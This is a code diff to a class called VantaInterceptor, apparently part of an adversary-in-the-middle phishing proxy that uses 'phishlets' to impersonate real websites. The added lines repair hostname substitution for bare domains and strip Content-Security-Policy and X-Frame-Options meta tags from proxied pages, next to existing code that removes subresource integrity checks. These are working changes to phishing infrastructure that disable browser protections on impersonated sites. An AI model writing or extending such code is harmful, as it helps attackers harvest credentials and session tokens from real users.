@@ -564,7 +564,13 @@ class VantaInterceptor:
 
                 # Prepare replacement
                 target_hostname = f"{f.orig_sub}.{f.domain}"
+                if not f.orig_sub and f.domain: # Handle empty subdomain
+                     target_hostname = f.domain
+                
                 phish_hostname = None
+                
+                # DEBUG LOG
+                self.logger.info(f"SubFilter Debug: {target_hostname} | Base: {base_domain} | Replace: {f.replace}")
 
                 # 1. Check Bridge (Priority for Single Domain / Path-based routing)
                 for br in getattr(self.phishlet, "bridges", []):
@@ -616,6 +622,9 @@ class VantaInterceptor:
             try:
                 flow.response.text = re.sub(r' integrity="[^"]*"', '', flow.response.text)
                 flow.response.text = re.sub(r" integrity='[^']*'", '', flow.response.text)
+                # Remove CSP meta tags
+                flow.response.text = re.sub(r'<meta http-equiv="Content-Security-Policy"[^>]*>', '', flow.response.text, flags=re.IGNORECASE)
+                flow.response.text = re.sub(r'<meta http-equiv="X-Frame-Options"[^>]*>', '', flow.response.text, flags=re.IGNORECASE)
             except Exception:
                 pass
 
